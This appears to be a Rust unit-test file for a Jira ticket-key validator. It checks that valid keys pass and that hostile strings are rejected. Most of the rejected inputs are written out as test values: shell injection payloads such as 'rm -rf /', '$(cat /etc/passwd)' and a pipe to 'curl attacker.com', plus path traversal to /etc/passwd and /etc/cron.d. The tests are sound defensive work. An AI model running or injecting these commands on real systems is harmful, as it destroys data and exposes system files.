use claude_dispatch::validate_ticket_key;

// --- Valid ticket keys ---

#[test]
fn test_validate_ticket_key_standard() {
    assert!(validate_ticket_key("PROJ-123"));
    assert!(validate_ticket_key("AB-1"));
    assert!(validate_ticket_key("LONGPROJECT-99999"));
}

#[test]
fn test_validate_ticket_key_with_digits_in_project() {
    // Jira allows digits in the project prefix after the first letter
    assert!(validate_ticket_key("PROJ2-42"));
    assert!(validate_ticket_key("A1B2-1"));
}

// --- Shell injection attempts ---

#[test]
fn test_reject_shell_injection_semicolon() {
    assert!(!validate_ticket_key("; rm -rf / #"));
}

#[test]
fn test_reject_shell_injection_backtick() {
    assert!(!validate_ticket_key("PROJ-`whoami`"));
}

#[test]
fn test_reject_shell_injection_dollar_paren() {
    assert!(!validate_ticket_key("PROJ-$(cat /etc/passwd)"));
}

#[test]
fn test_reject_shell_injection_pipe() {
    assert!(!validate_ticket_key("PROJ-1|curl attacker.com"));
}

#[test]
fn test_reject_shell_injection_ampersand() {
    assert!(!validate_ticket_key("PROJ-1&& echo pwned"));
}

#[test]
fn test_reject_shell_injection_quoted_breakout() {
    assert!(!validate_ticket_key("PROJ-1\"; rm -rf / \""));
}

#[test]
fn test_reject_shell_injection_newline() {
    assert!(!validate_ticket_key("PROJ-1\nrm -rf /"));
}

// --- Path traversal attempts ---

#[test]
fn test_reject_path_traversal_dotdot() {
    assert!(!validate_ticket_key("../../etc/passwd"));
}

#[test]
fn test_reject_path_traversal_in_key() {
    assert!(!validate_ticket_key("PROJ-123/../../etc/cron.d/evil"));
}

#[test]
fn test_reject_path_traversal_dotdot_only() {
    assert!(!validate_ticket_key(".."));
}

#[test]
fn test_reject_absolute_path() {
    assert!(!validate_ticket_key("/etc/passwd"));
}

// --- Malformed keys ---

#[test]
fn test_reject_empty_string() {
    assert!(!validate_ticket_key(""));
}

#[test]
fn test_reject_no_hyphen() {
    assert!(!validate_ticket_key("PROJ123"));
}

#[test]
fn test_reject_no_number() {
    assert!(!validate_ticket_key("PROJ-"));
}

#[test]
fn test_reject_no_project() {
    assert!(!validate_ticket_key("-123"));
}

#[test]
fn test_reject_lowercase_project() {
    assert!(!validate_ticket_key("proj-123"));
}

#[test]
fn test_reject_spaces_in_key() {
    assert!(!validate_ticket_key("PROJ -123"));
}

#[test]
fn test_reject_non_numeric_after_hyphen() {
    assert!(!validate_ticket_key("PROJ-abc"));
}

#[test]
fn test_reject_number_first_in_project() {
    assert!(!validate_ticket_key("1PROJ-42"));
}

#[test]
fn test_reject_special_chars_in_project() {
    assert!(!validate_ticket_key("PR@J-42"));
}

#[test]
fn test_reject_multiple_hyphens() {
    // splitn(2, '-') means "PROJ" and "1-2" — "1-2" is not all digits
    assert!(!validate_ticket_key("PROJ-1-2"));
}

// --- Unicode / null byte edge cases ---

#[test]
fn test_reject_null_byte() {
    assert!(!validate_ticket_key("PROJ-123\0"));
}

#[test]
fn test_reject_unicode_homoglyph() {
    // Cyrillic "А" looks like Latin "A" but is a different codepoint
    assert!(!validate_ticket_key("РROJ-123")); // Р is Cyrillic
}
